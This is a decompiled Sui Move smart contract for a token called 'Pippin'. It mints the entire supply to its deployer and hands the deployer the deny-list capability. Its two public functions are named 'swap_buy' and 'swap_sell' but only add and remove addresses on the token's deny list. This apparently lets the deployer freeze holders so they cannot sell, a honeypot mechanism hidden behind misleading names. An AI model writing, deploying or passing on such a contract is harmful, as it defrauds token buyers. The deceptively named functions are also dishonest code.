module 0x82a5b3042a121405b22d7497c718b8c0ece89d00a95eb09c79f36d4fad0e08e4::pippin {
    struct PIPPIN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PIPPIN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PIPPIN>(arg0, 9, b"pippin", b"Pippin", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmdcvSSBg7gWD4tvfXv3PuLtAiPyDZ5Z9w4LQVeRJKL3Lz"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PIPPIN>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PIPPIN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PIPPIN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PIPPIN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PIPPIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PIPPIN>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PIPPIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PIPPIN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

